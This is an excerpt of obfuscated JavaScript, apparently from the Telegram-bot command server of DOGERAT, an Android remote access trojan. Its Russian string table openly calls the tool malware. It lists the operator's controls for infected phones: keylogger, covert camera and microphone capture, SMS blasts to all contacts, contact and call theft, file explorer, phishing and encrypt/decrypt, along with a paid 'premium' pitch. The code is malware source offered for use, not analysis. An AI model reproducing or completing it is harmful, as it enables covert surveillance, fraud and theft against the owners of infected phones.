...
const actions = [
  'file', 'sockets', 'log', '✯ Клипборд ✯', 'express',
  '<b>✯ Введите номер телефона, который вы хотите отправить СМС</b>\n\n',
  '<b>✯ Новое устройство подключено</b>\n\n', 'multer',
  '✯ Отправить СМС всем контактам ✯', '84cPlils',
  '<b>✯ Главное меню</b>\n\n', '<b>версия</b> → ', 'listen',
  'readFileSync', '<b>✯ Выберите действие для выполнения для всех доступных устройств</b>\n\n',
  'popNotification', 'shift', '3234gTfIoe', 'time', 'all-sms',
  'no information', '1892960kuvEMZ', 'vibrateDuration', 'emit',
  '✯ Действие ✯', 'contacts', 'size', '3961580aPaxKE',
  '✯ Отмена действия ✯', '/text', '✯ Главная камера ✯', 'all',
  'smsNumber', '<b>✯ Введите текст, который вы хотите отправить всем целевым контактам</b>\n\n',
  'toast', 'currentNotificationText', '2169665ymIjdB', '3426UnzfvN',
  'get', '✯ СМС ✯', '3539044apenns',
  '<b>✯ Сообщение получено от → </b>', '✯ Назад в главное меню ✯',
  '✯ Декрипт ✯', '<b>✯ Устройство отключено</b>\n\n',
  'currentNumber', 'set', 'selfie-camera', 'http',
  '<b>✯ Нет подключенных устройств</b>\n\n', '14859208ppOnuo',
  'originalname', 'Разработано bởi: @CYBERSHIELDX',
  ' Устройства ✯', 'single', 'post',
  '<b>✯ Запрос был выполнен успешно, вы получите ответ устройства скоро...</b>\n\n✯ Вернуться в главное меню</b>\n\n',
  '✯ Кейлоггер ВКЛ ✯', '/start', 'currentTarget', '✯ Устройства ✯',
  'smsToAllContacts', 'disconnect', 'handshake', 'duration',
  'toastText', '✯ Остановить Аудио ✯', 'text',
  'DOGERAT — это вредоносное ПО для контроля Android-устройств\nЛюбое неправильное использование является ответственностью лица!\n\n',
  '<b>Устройство </b>', '<b>✯ Выберите действие для выполнения для </b>',
  'notificationText', '✯ Скриншот ✯', '✯ Вибрировать ✯',
  '<b>✯ Введите текст, который вы хотите отобразить как уведомление</b>\n\n',
  '18HiKXqZ', 'PORT', 'keylogger-off', '<b>ip</b> → ',
  'currentAction', '✯ О нас ✯', 'calls', 'url', '628531Xzwdkr',  'commend', 'Done', '5UQRBbM', '157863kmaaoD', 'env', 'token',
  '✯ Галерея ✯', '✯ Звонки ✯', 'createServer', 'textToAllContacts',
  '6831234vSnSLj', '✯ Воспроизвести аудио ✯', 'sendMessage', 'utf8',
  'smsText', 'headers', '✯ Фишинг ✯', '/upload', '✯ Энкрипт ✯',
  'forEach', '232370LYMeOO', '2414186GnuxVX',
  '<b>✯ Введите длительность записи микрофона в секундах</b>\n\n',
  '*/*', 'keylogger-on', 'delete', '1292HGSYoP', 'socket.io',
  '<b>время</b> → ', 'HTML', 'ping',
  '<b>✯ Добро пожаловать в DOGERAT</b>\n\n', 'apps', 'microphoneDuration',
  '2111820yZWyTe', '<b>модель</b> → ',
  '<b>✯ Введите сообщение, которое вы хотите отобразить в тост-боксе</b>\n\n',
  '721588iBLdHC', '✯ Открыть URL ✯', 'buffer', 'send',
  ...
  '\n\nСообщение → </b>', '✯ Тост ✯', 'sendSms', './data.json', 'https',
  '<b>✯ Подключенные устройства: </b>', '7207620ZaPjbY',
  '✯ Файловый проводник ✯', 'connection', 'push',
  '✯ Кейлоггер ВЫКЛ ✯', '✯ Селфи-камера ✯', 'error',
  '<b>✯ Сейчас введите сообщение, которое вы хотите отправить на </b>',
  'model', '<b>✯ Эта опция доступна только в премиум-версии, купите у @sphanter</b>\n\n',
  '✯ Микрофон ✯', '✯ Контакты ✯', 'main-camera', '</b>\n\n',
  '✯ Отправить СМС ✯', '12AEDsDj', '✯ Приложения ✯', 'vibrate'
];
...
bot.on('message', msg => {
  ...
  if (text === '/start') {
    ...
    const targetId = text.replace('✯ ', '').replace(' ✯', '');
    appData.set('currentTarget', targetId);
